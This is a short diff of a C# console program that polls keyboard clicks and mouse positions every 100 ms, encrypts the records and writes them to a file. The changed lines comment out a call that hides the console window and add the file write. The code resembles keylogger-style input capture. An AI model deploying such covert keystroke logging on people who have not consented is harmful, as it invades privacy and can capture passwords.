@@ -29,7 +29,7 @@ namespace ConsoleApp1
 		{
 		   
 			
-			ShowWindow(hWnd, 0); //0 hides cmd line, 1 shows.
+			//ShowWindow(hWnd, 0); //0 hides cmd line, 1 shows.
 			
 			stpWatch = new Stopwatch();
 			stpWatch.Start();
@@ -38,19 +38,19 @@ namespace ConsoleApp1
 			{
 				saveStates = new List<SaveState>();
 				st = EventCollection.Run(stpWatch);
-				Console.WriteLine(st.TimeGet + "|" + st.KeyboardClick + "|" + st.MousePossition.X + "|" + st.MousePossition.Y);//
+				//Console.WriteLine(st.TimeGet + "|" + st.KeyboardClick + "|" + st.MousePossition.X + "|" + st.MousePossition.Y);//
 				saveStates.Add(st);
 
 				Thread.Sleep(100);
-				//TODO: Ecrypt data file
+				//Ecrypt data file
 				
 				string temp = Encrypt.GetEncData(saveStates);
 				//gets encrypted data into a string like "~$~$~st.time~$~KeyboardPress~$~mouseXPos~$~mouseYPos" but encrypted
-				Console.WriteLine(temp);
+				//Console.WriteLine(temp);
 
 				//TODO: Write to file
-
-
+				WriteToFile.Run(temp);
+				//Console.ReadKey();
 				//conditions to end code.
 				if (timespan == MaxTime-1)//might need to give leway
 				{
